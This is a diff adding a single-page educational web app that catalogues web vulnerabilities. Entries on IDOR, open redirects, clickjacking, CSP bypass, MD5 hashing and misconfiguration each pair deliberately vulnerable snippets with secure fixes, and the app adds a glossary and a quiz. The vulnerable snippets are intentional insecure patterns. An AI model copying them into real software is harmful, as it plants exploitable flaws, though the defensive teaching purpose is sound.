+        relatedAttacks: ['weak-session', 'security-misconfig'],
+        incidents: [
+          { title: 'GitHub Credential Stuffing', year: 2013, description: 'Attackers compromised weak accounts using massive credential libraries.' }
+        ]
+      },
+      {
+        id: 'security-misconfig',
+        name: 'Security Misconfiguration',
+        severity: 'Medium',
+        icon: 'settings',
+        description: 'Custom Visual: Settings panel. Explains the risk of default credentials, verbose error pages, and open directory indexes.',
+        overview: 'Security Misconfiguration occurs when server settings, framework options, or system configurations are left unhardened (e.g. keeping default passwords, leaving directory listing enabled, or outputting verbose server error traces).',
+        realWorldImpact: 'Information disclosure. Attackers can browse server directories, read config files containing SQL keys, or find default admin passwords.',
+        codeLang: 'Apache Config',
+        codeVuln: '# Vulnerable: directory browsing enabled\nOptions Indexes FollowSymLinks\n# Verbose error trace active in php.ini\ndisplay_errors = On',
+        codeSecure: '# Secure: disable directory indexes\nOptions -Indexes\n# Disable trace display in php.ini\ndisplay_errors = Off',
+        rootCause: 'Failure to harden server configurations, disable defaults, and sanitize error traces.',
+        prevention: [
+          'Disable directory listings (Options -Indexes in Apache).',
+          'Change all default installation credentials immediately.',
+          'Disable verbose error display on production servers.'
+        ],
+        howItWorks: [
+          'Attacker opens directory path: domain.com/config/',
+          'Server displays file index directory tree',
+          'Attacker clicks and views database_config.php containing raw credentials',
+          'Attacker logs into database directly'
+        ],
+        relatedAttacks: ['broken-access-control', 'file-inclusion'],
+        incidents: [
+          { title: 'MongoDB Open DBs', year: 2017, description: 'Thousands of databases were exposed online due to default configuration bindings.' }
+        ]
+      },
+      {
+        id: 'broken-access-control',
+        name: 'Broken Access Control',
+        severity: 'High',
+        icon: 'user-check',
+        description: 'Custom Visual: ID badges. Explains how insecure direct references allow users to fetch details belonging to others.',
+        overview: 'Broken Access Control (including IDOR) occurs when the backend server fails to verify if the currently logged-in user has permission to request a specific file, record, or resource.',
+        realWorldImpact: 'Attackers can read, modify, or delete data belonging to other accounts, bypass transaction boundaries, or escalate their user roles to administrators.',
+        codeLang: 'PHP',
+        codeVuln: '$id = $_GET[\'id\'];\n// Reads record directly with no ownership checks\n$res = $db->query("SELECT * FROM profiles WHERE id = $id");',
+        codeSecure: '$id = $_GET[\'id\'];\n$user = $_SESSION[\'user_id\'];\n// Verify ownership strictly in SQL logic\n$stmt = $db->prepare("SELECT * FROM profiles WHERE id = ? AND owner_id = ?");\n$stmt->bind_param("ii", $id, $user);\n$stmt->execute();',
+        rootCause: 'Relying on client-supplied parameters for resource retrieval without verifying ownership backend.',
+        prevention: [
+          'Enforce strict backend ownership validation checks for every database request.',
+          'Use non-predictable UUIDs instead of sequential numeric IDs.',
+          'Implement Role-Based Access Control (RBAC) middleware.'
+        ],
+        howItWorks: [
+          'User views profile: domain.com/profile?id=1005',
+          'User changes parameter: domain.com/profile?id=1006',
+          'Server returns details of another user profile without verifying ownership',
+          'User exfiltrates private accounts data'
+        ],
+        relatedAttacks: ['weak-session', 'sql-injection'],
+        incidents: [
+          { title: 'First American Financial', year: 2019, description: 'Exposed 885 million real estate records due to a basic IDOR path leak.' }
+        ]
+      },
+      {
+        id: 'clickjacking',
+        name: 'Clickjacking (UI Redress)',
+        severity: 'Medium',
+        icon: 'layers',
+        description: 'Custom Visual: Layered deck. Explains how transparent iframes are overlaid over harmless game buttons to hijack clicks.',
+        overview: 'Clickjacking is a client-side attack where an attacker overlays a transparent iframe containing a target page above a harmless button on their site, tricking users into clicking items on the target page.',
+        realWorldImpact: 'Users click items thinking they are playing a game, but actually transfer funds, delete accounts, change emails, or follow attackers on social pages.',
+        codeLang: 'HTML/CSS',
+        codeVuln: '<!-- Attacker site embedding vulnerable target target page -->\n<iframe src="https://bank.com/transfer" style="opacity: 0; position: absolute; z-index: 10;"></iframe>\n<button style="z-index: 1;">CLICK_TO_PLAY_GAME</button>',
+        codeSecure: '<!-- Secured backend blocking framing headers -->\nHeader set X-Frame-Options "DENY"\n# Or using Content-Security-Policy\nHeader set Content-Security-Policy "frame-ancestors \'none\';"',
+        rootCause: 'Allowing web pages to be framed by arbitrary external domains without control headers.',
+        prevention: [
+          'Set X-Frame-Options header to DENY or SAMEORIGIN.',
+          'Configure Content-Security-Policy (CSP) with frame-ancestors directive.',
+          'Adopt modern UI frameworks that refuse framing contexts.'
+        ],
+        howItWorks: [
+          'Attacker loads target bank page inside transparent iframe',
+          'Attacker places "Get Free Money" button directly below bank\'s "Transfer" button',
+          'Victim clicks "Get Free Money"',
+          'Browser intercepts click, sending it to bank\'s "Transfer" button instead'
+        ],
+        relatedAttacks: ['csrf', 'xss-dom'],
+        incidents: [
+          { title: 'Twitter Clickjacking', year: 2009, description: 'Tricked users into sharing worm links via transparent retweet overlays.' }
+        ]
+      },
+      {
+        id: 'open-redirect',
+        name: 'Open Redirects',
+        severity: 'Medium',
+        icon: 'globe',
+        description: 'Custom Visual: Domain router. Explains how dynamic redirect variables forward visitors to external phishing sites.',
+        overview: 'Open Redirect vulnerabilities occur when a web application takes a user-supplied parameter and redirects the visitor to that destination URL without validation.',
+        realWorldImpact: 'Enables highly convincing phishing attacks. Users click a trusted link like Google but are redirected to a phishing clone site to capture passwords.',
+        codeLang: 'PHP',
+        codeVuln: '$next = $_GET[\'redirect\'];\n// Redirects directly with no destination check\nheader("Location: " . $next);',
+        codeSecure: '$next = $_GET[\'redirect\'];\n// Validate URL belongs to trusted domains or is relative\nif (str_starts_with($next, "/") || parse_url($next, PHP_URL_HOST) === \'trusted.com\') {\n  header("Location: " . $next);\n} else {\n  header("Location: /home");\n}',
+        rootCause: 'Using unvalidated client parameter variables in HTTP Location header redirects.',
+        prevention: [
+          'Avoid dynamic user-supplied redirects where possible.',
+          'Restrict redirections to local relative paths (starting with /).',
+          'Implement a strict whitelist of accepted destination host domains.'
+        ],
+        howItWorks: [
+          'Attacker crafts link: trusted.com/login?redirect=https://phishing.com',
+          'Victim signs into trusted.com successfully',
+          'Trusted server forwards visitor automatically to phishing.com',
+          'Victim is unaware they have left the trusted domain'
+        ],
+        relatedAttacks: ['csrf', 'weak-session'],
+        incidents: [
+          { title: 'Shopify Bug Bounty', year: 2016, description: 'Open redirect leak was chained to leak OAuth tokens to external domains.' }
+        ]
+      },
+      {
+        id: 'csp-bypass',
+        name: 'Content Security Policy Bypass',
+        severity: 'Medium',
+        icon: 'shield-alert',
+        description: 'Custom Visual: CDN whitelist. Explains how broad configuration rules allow scripts to execute via whitelist domains.',
+        overview: 'CSP Bypass occurs when the Content Security Policy header is configured loosely, allowing attackers to bypass inline script blocks using broad whitelisted domains or JSONP endpoints.',
+        realWorldImpact: 'Neutralizes XSS mitigation benefits. Attackers can execute arbitrary scripts on the page despite CSP shields.',
+        codeLang: 'HTTP Header',
+        codeVuln: '# Loose policy allowing wildcards and broad whitelists\nContent-Security-Policy: default-src \'self\' *.googleapis.com;',
+        codeSecure: '# Strict nonce-based CSP configuration\nContent-Security-Policy: default-src \'self\'; script-src \'nonce-r4nd0m\' \'strict-dynamic\';',
+        rootCause: 'Using overly broad domain whitelists or unsafe configurations in CSP policy definitions.',
+        prevention: [
+          'Avoid whitelisting entire CDNs; use strict nonce-based or hash-based CSP configurations.',
+          'Disable unsafe-inline and unsafe-eval directives.',
+          'Review configurations using tools like Google\'s CSP Evaluator.'
+        ],
+        howItWorks: [
+          'Attacker exploits XSS but CSP blocks inline script tags',
+          'Attacker references whitelisted CDN domain containing hosting scripts',
+          'Browser loads and executes CDN script because it matches whitelist policies',
+          'CSP checks bypasses and XSS payload executes successfully'
+        ],
+        relatedAttacks: ['xss-reflected', 'xss-stored'],
+        incidents: [
+          { title: 'Google CSP Bypass', year: 2016, description: 'Researchers bypassed Google\'s CSP using whitelisted JSONP endpoints.' }
+        ]
+      },
+      {
+        id: 'cryptographic-failures',
+        name: 'Cryptographic Failures',
+        severity: 'High',
+        icon: 'refresh-cw',
+        description: 'Custom Visual: Broken padlock key. Explains the risk of raw hashes (MD5) and insecure plaintext data transfers.',
+        overview: 'Cryptographic Failures (formerly Sensitive Data Exposure) occur when systems fail to encrypt sensitive data in transit or at rest, use deprecated hashing algorithms (like MD5 or SHA1), or manage cryptographic keys insecurely.',
+        realWorldImpact: 'Massive credentials leaks. If database tables are compromised, weak MD5 hashes are easily cracked via dictionary attacks, exposing original passwords.',
+        codeLang: 'PHP',
+        codeVuln: '$pass = $_POST[\'pass\'];\n// Vulnerable: MD5 hash is easily cracked\n$hash = md5($pass);\n$db->save($hash);',
+        codeSecure: '$pass = $_POST[\'pass\'];\n// Secure: use Bcrypt/Argon2 with auto-generated salts\n$hash = password_hash($pass, PASSWORD_BCRYPT);\n$db->save($hash);',
+        rootCause: 'Using outdated hashing algorithms or insecure key storage models.',
+        prevention: [
+          'Use modern hash standards (Bcrypt, Argon2, PBKDF2).',
+          'Encrypt sensitive values at rest using AES-256.',
+          'Enforce HTTPS/TLS with HSTS for data in transit.'
+        ],
+        howItWorks: [
+          'Attacker compromises user password database table',
+          'Password database stores passwords as MD5 hashes: 81dc9bdb52d04dc20036dbd8313ed055',
+          'Attacker inputs hash into rainbow lookup table dictionary database',
+          'Dictionary table resolves hash to plaintext password: "1234"'
+        ],
+        relatedAttacks: ['brute-force', 'weak-session'],
+        incidents: [
+          { title: 'Ashley Madison Breach', year: 2015, description: 'Exposed millions of accounts due to weak bcrypt/MD5 hashing combinations.' }
+        ]
+      }
+    ];
+
+    const glossaryTerms = [
+      { term: 'SQL', category: 'Database', definition: 'Structured Query Language, used to query relational databases.' },
+      { term: 'XSS', category: 'Injection', definition: 'Cross-Site Scripting, injecting browser-executable scripts into pages.' },
+      { term: 'DOM', category: 'Client-Side', definition: 'Document Object Model, the browser\'s internal representation of HTML nodes.' },
+      { term: 'CSRF', category: 'Web-State', definition: 'Cross-Site Request Forgery, executing actions on behalf of another user session.' },
+      { term: 'LFI', category: 'Path-Traversal', definition: 'Local File Inclusion, loading files residing locally on the web server filesystem.' },
+      { term: 'RFI', category: 'Path-Traversal', definition: 'Remote File Inclusion, loading script files hosted on external servers.' },
+      { term: 'CSP', category: 'Headers', definition: 'Content Security Policy, header restricting domains browser can load resources from.' },
+      { term: 'Prepared Statement', category: 'Database', definition: 'SQL statement compiling execution query logic before inserting inputs.' },
+      { term: 'SameSite Cookie', category: 'Headers', definition: 'Cookie flag determining if cookies are sent in cross-site requests.' },
+      { term: 'Nonce', category: 'Headers', definition: 'A unique cryptographically random token used once to authenticate script tags.' }
+    ];
+
+    const quizQuestions = [
+      {
+        question: 'Which secure coding technique is the absolute root mitigation for SQL Injection (SQLi)?',
+        options: [
+          'Escaping input characters using simple string filters',
+          'Using Prepared Statements (Parameterized Queries) consistently',
+          'Implementing a local client-side input length check',
+          'Restricting inputs to alphanumeric characters via regex'
+        ],
+        correctAnswer: 1,
+        explanation: 'Prepared Statements separate query code tokens from dynamic variables, ensuring database engines treat parameters strictly as data value contents, rendering injection impossible.'
+      },
+      {
+        question: 'Why does DOM-based XSS differ from Reflected XSS?',
+        options: [
+          'It executes malicious scripts in the database persistently',
+          'The server is not involved; JavaScript processes inputs directly inside client DOM sinks',
+          'It requires compiling host shell command lines first',
+          'It is executed only when users frame transparent overlays'
+        ],
+        correctAnswer: 1,
+        explanation: 'DOM XSS occurs entirely client-side. JavaScript reads data from sources (like location.hash) and writes to sinks (like innerHTML) without sending parameters to backends.'
+      },
+      {
+        question: 'How do you block Clickjacking attacks on standard web servers?',
+        options: [
+          'Deploying Anti-CSRF tokens in form parameters',
+          'Enabling SameSite flags on session cookies',
+          'Configuring X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors',
+          'Using Bcrypt instead of MD5 to hash password inputs'
+        ],
+        correctAnswer: 2,
+        explanation: 'Clickjacking overlays transparent frames. Setting X-Frame-Options or frame-ancestors instructs browsers to block foreign domains from loading the page inside iframes.'
+      },
+      {
+        question: 'What is the main danger of Remote File Inclusion (RFI) vulnerabilities?',
+        options: [
+          'Attackers can trigger time delays using SLEEP statements',
+          'Allows attackers to execute arbitrary code on the server by loading external script files',
+          'Enables automated bots to submit spam registration forms',
+          'Exposes raw cookies to client-side document.cookie inputs'
+        ],
+        correctAnswer: 1,
+        explanation: 'RFI loads external scripts (like PHP shells) straight onto server include processes, causing direct Remote Code Execution (RCE) on the host backend.'
+      },
+      {
+        question: 'Which hashing standard is safe for storing user authentication passwords?',
+        options: [
+          'MD5 Hashing',
+          'SHA1 Encoding',
+          'Base64 Encoding',
+          'Bcrypt or Argon2'
+        ],
+        correctAnswer: 3,
+        explanation: 'Bcrypt and Argon2 are slow hashing algorithms with built-in salts, designed to resist rapid brute force and dictionary lookup attacks.'
+      }
+    ];
+
+    // Router, State, & Navigation Logic
+    // State
+    let exploredAttacks = JSON.parse(localStorage.getItem('explored') || '[]');
+    let currentQuizIndex = 0;
+    let selectedOption = null;
+    let quizSubmitted = false;
+    let quizScore = 0;
+    let quizEnded = false;
+
+    const updateHeaderCounters = () => {
+      document.getElementById('explored-counter').innerText = `${exploredAttacks.length}/18`;
+      localStorage.setItem('explored', JSON.stringify(exploredAttacks));
+    };
+
+    const toggleExplored = (id) => {
+      if (exploredAttacks.includes(id)) {
+        exploredAttacks = exploredAttacks.filter(a => a !== id);
+      } else {
+        exploredAttacks.push(id);
+      }
+      updateHeaderCounters();
+      renderPage();
+    };
+
+    // Client-side Router
+    const routes = {
+      '/': renderHome,
+      '/glossary': renderGlossary,
+      '/quiz': renderQuiz,
+      '/attack': renderAttackDetail
+    };
+
+    const getRoute = () => {
+      const hash = window.location.hash || '#/';
+      if (hash.startsWith('#/attack/')) {
+        return { path: '/attack', param: hash.replace('#/attack/', '') };
+      }
+      return { path: hash.replace('#', ''), param: null };
+    };
+
+    const navigateTo = (hash) => {
+      window.location.hash = hash;
+    };
+
+    // Render logic
+    const renderPage = () => {
+      const { path, param } = getRoute();
+      
+      // Update Navigation Active classes
+      document.getElementById('nav-home').className = path === '/' ? 'text-cyber-green border-b border-cyber-green/50 pb-0.5' : 'text-cyber-text-muted';
+      document.getElementById('nav-glossary').className = path === '/glossary' ? 'text-cyber-green border-b border-cyber-green/50 pb-0.5' : 'text-cyber-text-muted';
+      document.getElementById('nav-quiz').className = path === '/quiz' ? 'text-cyber-green border-b border-cyber-green/50 pb-0.5' : 'text-cyber-text-muted';
+      
+      document.getElementById('mob-home').className = path === '/' ? 'text-cyber-green font-bold' : 'text-cyber-text-muted';
+      document.getElementById('mob-glossary').className = path === '/glossary' ? 'text-cyber-green font-bold' : 'text-cyber-text-muted';
+      document.getElementById('mob-quiz').className = path === '/quiz' ? 'text-cyber-green font-bold' : 'text-cyber-text-muted';
+
+      const renderFn = routes[path] || renderHome;
+      document.getElementById('router-view').innerHTML = renderFn(param);
+      
+      // Re-init lucide icons on render
+      lucide.createIcons();
+      window.scrollTo(0, 0);
+    };
+
+    window.addEventListener('hashchange', renderPage);
+    window.addEventListener('load', () => {
+      updateHeaderCounters();
+      renderPage();
+    });
+
+    // Page: Home View
+    let searchQuery = '';
+    let selectedSeverity = 'All';
+
+    function renderHome() {
+      // Filter list
+      const filtered = attacks.filter(a => {
+        const matchesSearch = a.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
+                              a.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
+                              a.rootCause.toLowerCase().includes(searchQuery.toLowerCase());
+        const matchesSeverity = selectedSeverity === 'All' || a.severity === selectedSeverity;
+        return matchesSearch && matchesSeverity;
+      });
+
+      const severities = ['All', 'Low', 'Medium', 'High', 'Critical'];
+      
+      return `
+        <div class="relative mx-auto max-w-4xl px-4 py-12 text-center sm:px-6 lg:px-8">
+          
+          <!-- Console Hero -->
+          <div class="rounded-xl border border-cyber-border bg-cyber-bg-darker/70 p-6 shadow-2xl backdrop-blur-sm">
+            <div class="flex items-center justify-between border-b border-cyber-border pb-3 mb-5 text-left">
+              <div class="flex items-center gap-2 font-mono text-xs text-cyber-text-muted">
+                <i data-lucide="terminal" class="h-4 w-4 text-cyber-green"></i>
+                <span>SHELL_SESSION - SECURE_ACCESS@LOCAL</span>
+              </div>
+              <div class="flex gap-1.5">
+                <span class="h-3 w-3 rounded-full bg-cyber-red/20 border border-cyber-red/40"></span>
+                <span class="h-3 w-3 rounded-full bg-cyber-orange/20 border border-cyber-orange/40"></span>
+                <span class="h-3 w-3 rounded-full bg-cyber-green/20 border border-cyber-green/40"></span>
+              </div>
+            </div>
+
+            <!-- Hero Image Banner -->
+            <div class="mb-6 rounded-lg overflow-hidden border border-cyber-border/80 max-h-[190px] shadow-lg relative group">
+              <div class="absolute inset-0 bg-gradient-to-t from-cyber-bg-darker via-transparent to-transparent z-10 opacity-70"></div>
+              <img src="public/cyber_hero.jpg" alt="Cyber Security command visual" class="w-full h-full object-cover opacity-80" />
+            </div>
+
+            <!-- Title -->
+            <h1 class="font-mono text-2xl sm:text-4xl md:text-5xl font-extrabold tracking-widest text-cyber-green text-glow-green break-all">
+              $&gt; DVWA_ATTACK_EXPLORER
+            </h1>
+            <p class="mt-4 font-mono text-sm text-cyber-text-muted">
+              // Learn how web application vulnerabilities work conceptually — and how to secure them.
+            </p>
+
+            <!-- Stats -->
+            <div class="mt-8 grid grid-cols-2 gap-4 border-y border-cyber-border/40 py-4 font-mono text-xs sm:grid-cols-4">
+              <div class="flex flex-col items-center">
+                <span class="text-cyber-text-muted">CATALOG</span>
+                <span class="text-cyber-text-bright font-bold">18 CATEGORIES</span>
+              </div>
+              <div class="flex flex-col items-center border-l border-cyber-border/40">
+                <span class="text-cyber-text-muted">STANDARDS</span>
+                <span class="text-cyber-blue font-bold text-glow-blue">OWASP TOP 10</span>
+              </div>
+              <div class="flex flex-col items-center border-l border-cyber-border/40">
+                <span class="text-cyber-text-muted">STATUS</span>
+                <span class="text-cyber-green font-bold flex items-center gap-1">
+                  <span class="h-2 w-2 rounded-full bg-cyber-green animate-ping"></span> ONLINE
+                </span>
+              </div>
+              <div class="flex flex-col items-center border-l border-cyber-border/40">
+                <span class="text-cyber-text-muted">SECURITY</span>
+                <span class="text-cyber-orange font-bold text-glow-orange">100% CONCEPTUAL</span>
+              </div>
+            </div>
+
+            <!-- Search Inputs -->
+            <div class="mt-8 relative max-w-xl mx-auto">
+              <div class="absolute inset-y-0 left-0 flex items-center pl-3">
+                <i data-lucide="search" class="h-5 w-5 text-cyber-text-muted"></i>
+              </div>
+              <input
+                type="text"
+                id="search-input"
+                value="${searchQuery}"
+                placeholder="Search vulnerabilities by name or root cause..."
+                class="block w-full rounded-lg border border-cyber-border bg-cyber-bg/90 py-3 pl-10 pr-4 font-mono text-sm text-cyber-text-bright outline-none focus:border-cyber-green focus:ring-1 focus:ring-cyber-green/30"
+                oninput="updateSearch(this.value)"
+              />
+            </div>
+
+            <!-- Filter Buttons -->
+            <div class="mt-6 flex flex-wrap items-center justify-center gap-3">
+              <span class="font-mono text-xs text-cyber-text-muted">SEVERITY:</span>
+              <div class="flex flex-wrap gap-2">
+                ${severities.map(sev => `
+                  <button 
+                    onclick="updateFilter('${sev}')"
+                    class="rounded border px-3 py-1 font-mono text-xs uppercase tracking-wider transition ${
+                      selectedSeverity === sev 
+                        ? 'border-cyber-green bg-cyber-green/10 text-cyber-green font-bold shadow-[0_0_8px_rgba(16,185,129,0.2)]'
+                        : 'border-cyber-border bg-cyber-bg text-cyber-text-muted hover:border-cyber-border/80 hover:text-cyber-text-bright'
+                    }"
+                  >${sev}</button>
+                `).join('')}
+              </div>
+            </div>
+
+          </div>
+
+          <!-- Cards Grid -->
+          <div class="mx-auto max-w-6xl mt-10 text-left">
+            <div class="flex items-center justify-between border-b border-cyber-border/40 pb-2 mb-6 font-mono text-xs">
+              <span>// DISCOVERED_THREATS (${filtered.length})</span>
+              <span>INDEX: SEC_CAT_V1</span>
+            </div>
+            
+            ${filtered.length > 0 ? `
+              <div class="grid grid-cols-1 gap-6 sm:grid-cols-2 lg:grid-cols-3">
+                ${filtered.map(a => {
+                  const explored = exploredAttacks.includes(a.id);
+                  return `
+                    <div class="group relative rounded-xl border border-cyber-border bg-cyber-card p-5 shadow-lg hover-float ${explored ? 'border-cyber-green/30' : ''}">
+                      
+                      <!-- Explored Checkbox -->
+                      <div class="absolute top-4 right-4 z-10">
+                        <label class="flex items-center gap-1.5 cursor-pointer font-mono text-[10px]" onclick="event.stopPropagation()">
+                          <input
+                            type="checkbox"
+                            ${explored ? 'checked' : ''}
+                            onchange="toggleExploredHome('${a.id}')"
+                            class="h-3.5 w-3.5 rounded border-cyber-border bg-cyber-bg text-cyber-green outline-none accent-cyber-green cursor-pointer"
+                          />
+                          <span class="hidden group-hover:inline select-none ${explored ? 'text-cyber-green' : 'text-cyber-text-muted'}">
+                            ${explored ? 'EXPLORED' : 'MARK READ'}
+                          </span>
+                        </label>
+                      </div>
+
+                      <a href="#/attack/${a.id}" class="block h-full">
+                        <div class="flex flex-col h-full justify-between">
+                          <div>
+                            <div class="mb-4 inline-flex items-center justify-center rounded-lg border border-cyber-border bg-cyber-bg-darker/65 p-3 text-cyber-blue transition group-hover:border-cyber-green/30 group-hover:text-cyber-green group-hover:shadow-[0_0_10px_rgba(16,185,129,0.15)]">
+                              <i data-lucide="${a.icon}" class="h-6 w-6"></i>
+                            </div>
+                            <h3 class="font-mono text-base font-bold text-cyber-text-bright transition group-hover:text-cyber-green group-hover:text-glow-green">
+                              ${a.name}
+                            </h3>
+                            <p class="mt-2 text-xs leading-relaxed text-cyber-text-muted line-clamp-2">
+                              ${a.description}
+                            </p>
+                          </div>
+
+                          <div class="mt-5 flex items-center justify-between border-t border-cyber-border/40 pt-3">
+                            <span class="rounded border px-2 py-0.5 font-mono text-[10px] font-bold uppercase ${
+                              a.severity === 'Critical' ? 'border-cyber-red/50 text-cyber-red bg-cyber-red/5' :
+                              a.severity === 'High' ? 'border-cyber-red/30 text-cyber-red bg-cyber-red/5' :
+                              a.severity === 'Medium' ? 'border-cyber-orange/40 text-cyber-orange bg-cyber-orange/5' :
+                              'border-cyber-green/40 text-cyber-green bg-cyber-green/5'
+                            }">
+                              ${a.severity}
+                            </span>
+                            <span class="font-mono text-[10px] tracking-wider text-cyber-green opacity-0 transition group-hover:opacity-100">
+                              EXPLORE &gt;
+                            </span>
+                          </div>
+                        </div>
+                      </a>
+
+                    </div>
+                  `;
+                }).join('')}
+              </div>
+            ` : `
+              <div class="mx-auto max-w-md rounded-xl border border-cyber-red/20 bg-cyber-bg-darker/65 p-8 text-center font-mono shadow-lg">
+                <i data-lucide="shield-alert" class="mx-auto h-12 w-12 text-cyber-red animate-pulse"></i>
+                <h3 class="mt-4 text-base font-bold text-cyber-text-bright">NO_MATCHES_FOUND</h3>
+                <p class="mt-2 text-xs text-cyber-text-muted">No vulnerabilities found matching your search parameters.</p>
+              </div>
+            `}
+          </div>
+
+        </div>
+      `;
+    }
+
+    const updateSearch = (val) => {
+      searchQuery = val;
+      const view = renderHome();
+      document.getElementById('router-view').innerHTML = view;
+      lucide.createIcons();
+      // Keep cursor focused at the end of the input
+      const input = document.getElementById('search-input');
+      input.focus();
+      input.selectionStart = input.selectionEnd = input.value.length;
+    };
+
+    const updateFilter = (val) => {
+      selectedSeverity = val;
+      renderPage();
+    };
+
+    const toggleExploredHome = (id) => {
+      if (exploredAttacks.includes(id)) {
+        exploredAttacks = exploredAttacks.filter(a => a !== id);
+      } else {
+        exploredAttacks.push(id);
+      }
+      updateHeaderCounters();
+      renderPage();
+    };
+
+    // Page: Glossary View
+    let glossarySearch = '';
+    let glossaryCategory = 'All';
+
+    function renderGlossary() {
+      const terms = glossaryTerms.filter(t => {
+        const matchesSearch = t.term.toLowerCase().includes(glossarySearch.toLowerCase()) || 
+                              t.definition.toLowerCase().includes(glossarySearch.toLowerCase());
+        const matchesCategory = glossaryCategory === 'All' || t.category === glossaryCategory;
+        return matchesSearch && matchesCategory;
+      });
+
+      const categories = ['All', ...new Set(glossaryTerms.map(t => t.category))];
+
+      return `
+        <div class="relative mx-auto max-w-4xl px-4 py-12 text-center sm:px-6 lg:px-8">
+          
+          <div class="rounded-xl border border-cyber-border bg-cyber-bg-darker/60 p-6 shadow-2xl backdrop-blur-sm mb-8 font-mono">
+            <div class="mb-6 rounded-lg overflow-hidden border border-cyber-border/80 max-h-[160px] shadow-lg relative">
+              <div class="absolute inset-0 bg-gradient-to-t from-cyber-bg-darker/70 via-transparent to-transparent z-10"></div>
+              <img src="public/cyber_glossary.jpg" alt="Glossary Banner" class="w-full h-full object-cover opacity-80" />
+            </div>
+            
+            <i data-lucide="book-open" class="mx-auto h-10 w-10 text-cyber-blue text-glow-blue animate-pulse mb-3"></i>
+            <h1 class="text-lg sm:text-2xl md:text-3xl font-bold tracking-widest text-cyber-blue text-glow-blue break-all">
+              $&gt; CYBER_GLOSSARY
+            </h1>
+            <p class="mt-2 text-xs text-cyber-text-muted max-w-xl mx-auto">
+              // Reference definitions for common terms, defensive controls, and protocols.
+            </p>
+
+            <div class="mt-6 relative max-w-lg mx-auto">
+              <div class="absolute inset-y-0 left-0 flex items-center pl-3">
+                <i data-lucide="search" class="h-4 w-4 text-cyber-text-muted"></i>
+              </div>
+              <input
+                type="text"
+                id="glossary-search"
+                value="${glossarySearch}"
+                placeholder="Search glossary terms..."
+                class="block w-full rounded-lg border border-cyber-border bg-cyber-bg/90 py-2 pl-9 pr-4 text-xs text-cyber-text-bright outline-none focus:border-cyber-blue"
+                oninput="updateGlossarySearch(this.value)"
+              />
+            </div>
+
+            <div class="mt-5 flex flex-wrap items-center justify-center gap-2">
+              <span class="text-[10px] text-cyber-text-muted">CATEGORIES:</span>
+              ${categories.map(cat => `
+                <button
+                  onclick="updateGlossaryFilter('${cat}')"
+                  class="rounded border px-2 py-0.5 text-[10px] uppercase tracking-wider transition ${
+                    glossaryCategory === cat 
+                      ? 'border-cyber-blue bg-cyber-blue/10 text-cyber-blue font-bold shadow-[0_0_6px_rgba(0,242,254,0.15)]'
+                      : 'border-cyber-border bg-cyber-bg text-cyber-text-muted hover:border-cyber-border/80 hover:text-cyber-text-bright'
+                  }"
+                >${cat}</button>
+              `).join('')}
+            </div>
+          </div>
+
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-left">
+            ${terms.map(t => `
+              <div class="rounded-lg border border-cyber-border bg-cyber-card p-5 shadow transition duration-300 hover:border-cyber-blue/40">
+                <div class="flex items-start justify-between gap-4">
+                  <h3 class="font-mono text-sm font-bold text-cyber-text-bright">${t.term}</h3>
+                  <span class="rounded border border-cyber-border bg-cyber-bg-darker px-2 py-0.5 font-mono text-[9px] uppercase text-cyber-blue">
+                    ${t.category}
+                  </span>
+                </div>
+                <p class="mt-3 text-xs leading-relaxed text-cyber-text-muted">${t.definition}</p>
+              </div>
+            `).join('')}
+          </div>
+
+        </div>
+      `;
+    }
+
+    const updateGlossarySearch = (val) => {
+      glossarySearch = val;
+      const view = renderGlossary();
+      document.getElementById('router-view').innerHTML = view;
+      lucide.createIcons();
+      const input = document.getElementById('glossary-search');
+      input.focus();
+      input.selectionStart = input.selectionEnd = input.value.length;
+    };
+
+    const updateGlossaryFilter = (cat) => {
+      glossaryCategory = cat;
+      renderPage();
+    };
+
+    // Page: Quiz View
+    function renderQuiz() {
+      const q = quizQuestions[currentQuizIndex];
+
+      return `
+        <div class="relative mx-auto max-w-4xl px-4 py-12 text-center sm:px-6 lg:px-8 pt-12">
+          
+          <div class="rounded-xl border border-cyber-border bg-cyber-bg-darker/70 p-6 shadow-2xl backdrop-blur-sm mb-8 font-mono">
+            <div class="mb-6 rounded-lg overflow-hidden border border-cyber-border/80 h-48 sm:h-56 shadow-lg relative">
+              <div class="absolute inset-0 bg-gradient-to-t from-cyber-bg-darker/70 via-transparent to-transparent z-10"></div>
+              <img src="public/cyber_trophy.jpg" alt="Quiz Banner" class="w-full h-full object-cover opacity-80" />
+            </div>
+            
+            <i data-lucide="award" class="mx-auto h-10 w-10 text-cyber-orange text-glow-orange animate-pulse mb-3"></i>
+            <h1 class="text-lg sm:text-2xl md:text-3xl font-bold tracking-widest text-cyber-orange text-glow-orange break-all">
+              $&gt; DEFENSE_KNOWLEDGE_ASSESSMENT
+            </h1>
+            <p class="mt-2 text-xs text-cyber-text-muted max-w-md mx-auto leading-relaxed">
+              // Test your understanding of web application vulnerabilities, root causes, and defensive mitigations.
+            </p>
+          </div>
+
+          <div class="rounded-xl border border-cyber-border bg-cyber-card p-6 sm:p-8 shadow-2xl backdrop-blur-sm text-left">
+            ${!quizEnded ? `
+              <div class="flex items-center justify-between border-b border-cyber-border/40 pb-3 mb-6 font-mono text-xs text-cyber-text-muted">
+                <span>QUESTION ${currentQuizIndex + 1} OF ${quizQuestions.length}</span>
+                <span>SCORE: ${quizScore}/${quizQuestions.length}</span>
+              </div>
+
+              <h2 class="text-base sm:text-lg font-bold text-cyber-text-bright mb-6">${q.question}</h2>
+
+              <div class="space-y-3 mb-6">
+                ${q.options.map((opt, i) => {
+                  let border = 'border-cyber-border hover:border-cyber-green/50 hover:bg-cyber-card-hover';
+                  let icon = '';
+
+                  if (selectedOption === i) border = 'border-cyber-blue bg-cyber-blue/5 text-cyber-blue font-semibold';
+                  
+                  if (quizSubmitted) {
+                    if (i === q.correctAnswer) {
+                      border = 'border-cyber-green bg-cyber-green/10 text-cyber-green font-semibold';
+                      icon = '<i data-lucide="check-circle-2" class="h-4 w-4 text-cyber-green text-glow-green"></i>';
+                    } else if (selectedOption === i) {
+                      border = 'border-cyber-red bg-cyber-red/10 text-cyber-red font-semibold';
+                      icon = '<i data-lucide="x-circle" class="h-4 w-4 text-cyber-red text-glow-red"></i>';
+                    } else {
+                      border = 'border-cyber-border/40 text-cyber-text-muted/40 cursor-not-allowed';
+                    }
+                  }
+
+                  return `
+                    <button
